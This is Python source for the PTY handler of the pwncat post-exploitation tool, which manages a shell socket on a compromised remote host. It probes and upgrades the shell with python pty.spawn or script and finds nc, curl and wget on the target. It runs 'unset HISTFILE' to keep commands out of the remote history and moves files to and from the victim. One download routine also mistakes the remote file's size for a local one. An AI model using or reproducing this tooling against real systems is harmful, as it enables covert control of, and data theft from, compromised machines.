#!/usr/bin/env python3
from typing import Dict, Optional, Iterable
from prompt_toolkit import PromptSession, ANSI
from prompt_toolkit.shortcuts import ProgressBar
from prompt_toolkit.completion import (
    Completer,
    PathCompleter,
    Completion,
    CompleteEvent,
    NestedCompleter,
    WordCompleter,
    merge_completers,
)
from prompt_toolkit.document import Document
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
import subprocess
import logging
import argparse
import base64
import time
import socket
import enum
import shlex
import sys
import os

from pwncat import util
from pwncat import downloader, uploader
from colorama import Fore


class State(enum.Enum):
    """ The current PtyHandler state """

    NORMAL = enum.auto()
    RAW = enum.auto()
    COMMAND = enum.auto()


def with_parser(f):
    def _decorator(self, argv):
        try:
            parser = getattr(self, f.__name__.split("do_")[1] + "_parser")
            args = parser.parse_args(argv)
        except SystemExit:
            return
        return f(self, args)

    return _decorator


class RemotePathCompleter(Completer):
    def __init__(self, pty: "PtyHandler"):
        self.pty = pty

    def get_completions(self, document: Document, complete_event: CompleteEvent):

        before = document.get_word_before_cursor()
        path, partial_name = os.path.split(before)

        if path == "":
            path = "."

        # Ensure the directory exists
        if self.pty.run(f"test -d {shlex.quote(path)} && echo -n good") != b"good":
            return

        files = self.pty.run(f"ls -1 -a {shlex.quote(path)}").decode("utf-8").strip()
        files = files.split()

        for name in files:
            if name.startswith(partial_name):
                yield Completion(
                    name, display=[("#ff0000", "(remote)"), ("", f" {name}")]
                )


class CommandCompleter(Completer):
    def __init__(self, description):
        self.description = description

    def get_completions(
        self, document: Document, complete_event: CompleteEvent
    ) -> Iterable[Completion]:
        # Split document.
        text = document.text_before_cursor.lstrip()
        stripped_len = len(document.text_before_cursor) - len(text)

        # If there is a space, check for the first term, and use a
        # subcompleter.
        if " " in text:
            first_term = text.split()[0]
            command = self.description.get(first_term)

            # If we have a sub completer, use this for the completions.
            if command is not None:
                options = [k for k in command if k != "positional"]
                terms = text.split(" ")

                if len(terms) > 2:
                    prev_term = terms[-2]
                else:
                    prev_term = None

                if prev_term in options:
                    completer = command[prev_term]
                else:
                    positionals = command.get("positional", [])
                    completer = merge_completers(
                        [WordCompleter(options, ignore_case=False)] + positionals
                    )

                for c in completer.get_completions(document, complete_event):
                    yield c

        # No space in the input: behave exactly like `WordCompleter`.
        else:
            completer = WordCompleter(list(self.description.keys()), ignore_case=False)
            for c in completer.get_completions(document, complete_event):
                yield c


class PtyHandler:
    """ Handles creating the pty on the remote end and locally processing input
    on the local end """

    OPEN_METHODS = {
        "script": "exec {} -qc /bin/bash /dev/null 2>&1",
        "python": "exec {} -c \"import pty; pty.spawn('/bin/bash')\" 2>&1",
    }

    INTERESTING_BINARIES = [
        "python",
        "python2",
        "python3",
        "perl",
        "bash",
        "dash",
        "zsh",
        "sh",
        "curl",
        "wget",
        "nc",
        "netcat",
        "ncat",
        "script",
    ]

    def __init__(self, client: socket.SocketType):
        """ Initialize a new Pty Handler. This will handle creating the PTY and
        setting the local terminal to raw. It also maintains the state to open a
        local terminal if requested and exit raw mode. """

        self.client = client
        self.state = "normal"
        self.saved_term_state = None
        self.input = b""
        self.lhost = None
        self.known_binaries = {}
        self.vars = {"lhost": util.get_ip_addr()}
        self.remote_prompt = "\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$"
        self.prompt = self.build_prompt_session()
        self.binary_aliases = {
            "python": [
                "python2",
                "python3",
                "python2.7",
                "python3.6",
                "python3.8",
                "python3.9",
            ],
            "sh": ["bash", "zsh", "dash"],
            "nc": ["netcat", "ncat"],
        }

        # Setup the argument parsers for local the local prompt
        self.setup_command_parsers()

        # We should always get a response within 3 seconds...
        self.client.settimeout(3)

        util.info("probing for prompt...", overlay=False)
        start = time.time()
        prompt = b""
        try:
            while time.time() < (start + 0.1):
                prompt += self.client.recv(1)
        except socket.timeout:
            pass

        # We assume if we got data before sending data, there is a prompt
        if prompt != b"":
            self.has_prompt = True
            util.info(f"found a prompt", overlay=True)
        else:
            self.has_prompt = False
            util.info("no prompt observed", overlay=True)

        # Send commands without a new line, and see if the characters are echoed
        util.info("checking for echoing", overlay=True)
        self.client.send(b"echo")
        response = b""

        try:
            while len(response) < 7:
                response += self.client.recv(7 - len(response))
        except socket.timeout:
            pass

        if response == b"echo":
            self.has_echo = True
            util.info("found input echo", overlay=True)
        else:
            self.has_echo = False
            util.info(f"no echo observed", overlay=True)

        self.client.send(b"\n")
        response = self.client.recv(1)
        if response == "\r":
            self.client.recv(1)
            self.has_cr = True
        else:
            self.has_cr = False

        if self.has_echo:
            self.recvuntil(b"\n")

        # Ensure history is disabled
        util.info("disabling remote command history", overlay=True)
        self.run("unset HISTFILE")

        util.info("setting terminal prompt", overlay=True)
        self.run(f'export PS1="(remote) {self.remote_prompt} "')

        # Locate interesting binaries
        # The auto-resolving doesn't work correctly until we have a pty
        # so, we manually resolve a list of useful binaries prior to spawning
        # a pty
        for name in PtyHandler.INTERESTING_BINARIES:
            util.info(
                f"resolving remote binary: {Fore.YELLOW}{name}{Fore.RESET}",
                overlay=True,
            )

            # Look for the given binary
            response = self.run(f"which {shlex.quote(name)}").strip()
            if response == b"":
                continue

            self.known_binaries[name] = response.decode("utf-8")

        # Now, we can resolve using `which` w/ request=False for the different
        # methods
        for m, cmd in PtyHandler.OPEN_METHODS.items():
            if self.which(m, request=False) is not None:
                method_cmd = cmd.format(self.which(m, request=False))
                method = m
                break
        else:
            util.error("no available methods to spawn a pty!")
            raise RuntimeError("no available methods to spawn a pty!")

        # Open the PTY
        util.info(
            f"opening pseudoterminal via {Fore.GREEN}{method}{Fore.RESET}", overlay=True
        )
        self.run(method_cmd, wait=False)
        # client.sendall(method_cmd.encode("utf-8") + b"\n")

        # We just started a PTY, so we now have all three
        self.has_echo = True
        self.has_cr = True
        self.has_prompt = True

        util.info("setting terminal prompt", overlay=True)
        self.run(f'export PS1="(remote) {self.remote_prompt} "')

        # Make sure HISTFILE is unset in this PTY (it resets when a pty is
        # opened)
        self.run("unset HISTFILE")

        # Synchronize the terminals
        util.info("synchronizing terminal state", overlay=True)
        self.do_sync([])

        # Force the local TTY to enter raw mode
        self.enter_raw()

    def build_prompt_session(self):
        """ This is kind of gross because of the nested completer, so I broke
        it out on it's own. The nested completer must be updated separately
        whenever a new command or a command argument is changed. """

        remote_completer = RemotePathCompleter(self)
        local_completer = PathCompleter(
            only_directories=False, get_paths=lambda: [os.getcwd()], min_input_len=1
        )
        download_method_completer = WordCompleter(downloader.get_names())
        upload_method_completer = WordCompleter(uploader.get_names())

        completer_graph = {
            "download": {
                "-m": download_method_completer,
                "--method": download_method_completer,
                "-o": local_completer,
                "--output": local_completer,
                "positional": [remote_completer],
            },
            "upload": {
                "-m": upload_method_completer,
                "--method": upload_method_completer,
                "-o": remote_completer,
                "--output": remote_completer,
                "positional": [local_completer],
            },
            "back": None,
            "sync": None,
            "help": None,
        }

        return PromptSession(
            [("", "(local) "), ("#ff0000", "pwncat"), ("", "$ ")],
            completer=CommandCompleter(completer_graph),
            auto_suggest=AutoSuggestFromHistory(),
        )

    def which(self, name: str, request=True) -> str:
        """ Call which on the remote host and return the path. The results are
        cached to decrease the number of remote calls. """
        path = None

        if name in self.known_binaries and self.known_binaries[name] is not None:
            # Cached value available
            path = self.known_binaries[name]
        elif name not in self.known_binaries and request:
            # It hasn't been looked up before, request it.
            path = self.run(f"which {shlex.quote(name)}").decode("utf-8")
            if path == "":
                path = None

        if name in self.binary_aliases and path is None:
            # Look for aliases of this command as a last resort
            for alias in self.binary_aliases[name]:
                path = self.which(alias)
                if path is not None:
                    break

        # Cache the value
        self.known_binaries[name] = path

        return path

    def process_input(self, data: bytes):
        r""" Process a new byte of input from stdin. This is to catch "\r~C" and open
        a local prompt """

        # Send the new data to the client
        self.client.send(data)

        # Only process data following a new line
        if data == b"\r":
            self.input = data
        elif len(data) == 0:
            return
        else:
            self.input += data

        if self.input == b"\r~C":
            # Erase the current line on the remote host ("~C")
            # This is 2 backspace characters
            self.client.send(b"\x08" * 2 + b"\r")
            # Start processing local commands
            self.enter_command()
        elif len(self.input) >= 3:
            # Our only escapes are 3 characters (include the newline)
            self.input = b""

    def recv(self) -> bytes:
        """ Recieve data from the client """
        return self.client.recv(4096)

    def enter_raw(self, save: bool = True):
        """ Enter raw mode on the local terminal """
        old_term_state = util.enter_raw_mode()

        self.state = State.RAW

        # Save the state if requested
        if save:
            self.saved_term_state = old_term_state

    def enter_command(self):
        """ Enter commmand mode. This sets normal mode and uses prompt toolkit
        process commands from the user for the local machine """

        # Go back to normal mode
        self.restore()
        self.state = State.COMMAND

        # Hopefully this fixes weird cursor position issues
        sys.stdout.write("\n")

        # Process commands
        while self.state is State.COMMAND:
            try:
                try:
                    line = self.prompt.prompt()
                except (EOFError, OSError):
                    # The user pressed ctrl-d, go back
                    self.enter_raw()
                    continue

                if len(line) > 0 and line[0] == "!":
                    # Allow running shell commands
                    subprocess.run(line[1:], shell=True)
                    continue

                argv = shlex.split(line)

                # Empty command
                if len(argv) == 0:
                    continue

                try:
                    method = getattr(self, f"do_{argv[0]}")
                except AttributeError:
                    util.warn(f"{argv[0]}: command does not exist")
                    continue

                # Call the method
                method(argv[1:])
            except KeyboardInterrupt:
                continue

    @with_parser
    def do_back(self, _):
        """ Exit command mode """
        self.enter_raw(save=False)

    @with_parser
    def do_download(self, args):
        """ Download a file from the remote host """

        try:
            # Locate an appropriate downloader class
            DownloaderClass = downloader.find(self, args.method)
        except downloader.DownloadError as exc:
            util.error(f"{exc}")
            return

        # Grab the arguments
        path = args.path
        basename = os.path.basename(args.path)
        outfile = args.output.format(basename=basename)

        download = DownloaderClass(self, remote_path=path, local_path=outfile)

        # Get the remote file size
        size = self.run(f'stat -c "%s" {shlex.quote(path)} 2>/dev/null || echo "none"')
        if b"none" in size:
            util.error(f"{path}: no such file or directory")
            return
        size = int(size)

        with ProgressBar(
            [("#888888", "downloading with "), ("fg:ansiyellow", f"{download.NAME}")]
        ) as pb:
            counter = pb(range(os.path.getsize(path)))
            last_update = time.time()

            def on_progress(copied, blocksz):
                """ Update the progress bar """
                counter.items_completed += blocksz
                if counter.items_completed >= counter.total:
                    counter.done = True
                    counter.stopped = True
                if (time.time() - last_update) > 0.1:
                    pb.invalidate()

            download.serve(on_progress)

            download.command()

            try:
                while not counter.done:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                pass
            finally:
                download.shutdown()

            # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
            time.sleep(0.1)

    @with_parser
    def do_upload(self, args):
        """ Upload a file to the remote host """

        if not os.path.isfile(args.path):
            util.error(f"{args.path}: no such file or directory")
            return

        try:
            # Locate an appropriate downloader class
            UploaderClass = uploader.find(self, args.method)
        except uploader.UploadError as exc:
            util.error(f"{exc}")
            return

        path = args.path
        basename = os.path.basename(args.path)
        name = basename
        outfile = args.output.format(basename=basename)

        upload = UploaderClass(self, remote_path=outfile, local_path=path)

        with ProgressBar(
            [("#888888", "uploading via "), ("fg:ansiyellow", f"{upload.NAME}")]
        ) as pb:

            counter = pb(range(os.path.getsize(path)))
            last_update = time.time()

            def on_progress(copied, blocksz):
                """ Update the progress bar """
                counter.items_completed += blocksz
                if counter.items_completed >= counter.total:
                    counter.done = True
                    counter.stopped = True
                if (time.time() - last_update) > 0.1:
                    pb.invalidate()

            upload.serve(on_progress)
            upload.command()

            try:
                while not counter.done:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                pass
            finally:
                upload.shutdown()

            # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
            time.sleep(0.1)

    def do_sync(self, argv):
        """ Synchronize the remote PTY with the local terminal settings """

        TERM = os.environ.get("TERM", "xterm")
        columns, rows = os.get_terminal_size(0)

        self.run(f"stty rows {rows}")
        self.run(f"stty columns {columns}")
        self.run(f'export TERM="{TERM}"')

    def do_set(self, argv):
        """ Set or view the currently assigned variables """

        if len(argv) == 0:
            for k, v in self.vars.items():
                print(f" {k} = {shlex.quote(v)}")
            return

        parser = argparse.ArgumentParser(prog="set")
        parser.add_argument("variable", help="the variable name")
        parser.add_argument("value", help="the new variable type")

        try:
            args = parser.parse_args(argv)
        except SystemExit:
            # The arguments were parsed incorrectly, return.
            return

        self.vars[args.variable] = args.value

    def do_help(self, argv):
        """ View help for local commands """

        if len(argv) == 0:
            commands = [x for x in dir(self) if x.startswith("do_")]
        else:
            commands = [x for x in dir(self) if x.startswith("do_") and x[3:] in argv]

        for c in commands:
            help_msg = getattr(self, c).__doc__
            print(f"{c[3:]:15s}{help_msg}")

    def run(self, cmd, has_pty=True, wait=True) -> bytes:
        """ Run a command in the context of the remote host and return the
        output. This is run synchrounously.

            :param cmd: The command to run. Either a string or an argv list.
            :param has_pty: Whether a pty was spawned
        """

        if isinstance(cmd, list):
            cmd = shlex.join(cmd)

        EOL = b"\r" if has_pty else b"\n"

        if wait:
            command = f"echo _PWNCAT_DELIM_; {cmd}; echo _PWNCAT_DELIM_"
        else:
            command = cmd

        response = b""

        # Send the command to the remote host
        self.client.send(command.encode("utf-8") + b"\n")

        if wait:
            if self.has_echo:
                self.recvuntil(b"_PWNCAT_DELIM_")  # first in command
                self.recvuntil(b"_PWNCAT_DELIM_")  # second in command
                # Recieve line ending from output
                self.recvuntil(b"\n")

            self.recvuntil(b"_PWNCAT_DELIM_")  # first in output
            self.recvuntil(b"\n")
            response = self.recvuntil(b"_PWNCAT_DELIM_")
            response = response.split(b"_PWNCAT_DELIM_")[0]

            if self.has_cr:
                self.recvuntil(b"\r\n")
            else:
                self.recvuntil(b"\n")

        return response

    def recvuntil(self, needle: bytes, flags=0):
        """ Recieve data from the client until the specified string appears """

        result = b""
        while not result.endswith(needle):
            result += self.client.recv(1, flags)

        return result

    def restore(self):
        """ Restore the terminal state """
        util.restore_terminal(self.saved_term_state)
        self.state = State.NORMAL

    def setup_command_parsers(self):
        """ Setup the argparsers for the different local commands """

        self.upload_parser = argparse.ArgumentParser(prog="upload")
        self.upload_parser.add_argument(
            "--method",
            "-m",
            choices=uploader.get_names(),
            default=None,
            help="set the download method (default: auto)",
        )
        self.upload_parser.add_argument(
            "--output",
            "-o",
            default="./{basename}",
            help="path to the output file (default: basename of input)",
        )
        self.upload_parser.add_argument("path", help="path to the file to upload")

        self.download_parser = argparse.ArgumentParser(prog="download")
        self.download_parser.add_argument(
            "--method",
            "-m",
            choices=downloader.get_names(),
            default=None,
            help="set the download method (default: auto)",
        )
        self.download_parser.add_argument(
            "--output",
            "-o",
            default="./{basename}",
            help="path to the output file (default: basename of input)",
        )
        self.download_parser.add_argument("path", help="path to the file to download")

        self.back_parser = argparse.ArgumentParser(prog="back")
